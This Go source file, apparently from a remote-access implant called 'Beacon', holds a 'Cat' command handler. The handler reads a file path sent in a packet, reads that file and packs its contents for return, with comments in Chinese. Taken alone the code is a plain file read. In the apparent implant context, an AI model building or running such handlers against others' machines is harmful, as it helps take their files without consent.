package command

import (
	"Beacon/utils/common"
	"Beacon/utils/packet"
	"encoding/binary"
	"os"
)

func Cat(packer *packet.Parser, ACP int) ([]byte, error) {

	// 1. 解析文件路径
	path := common.ConvertCpToUTF8(packer.ParseString(), ACP)

	// 2. 读取文件内容
	content, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	size := make([]byte, 4)
	binary.BigEndian.PutUint32(size, uint32(len(content)))
	content = append(size, content...)

	// 3. 打包返回文件内容
	arr := []interface{}{path, content}
	packed, err := packet.PackArray(arr)
	if err != nil {
		return nil, err
	}

	return packed, nil
}
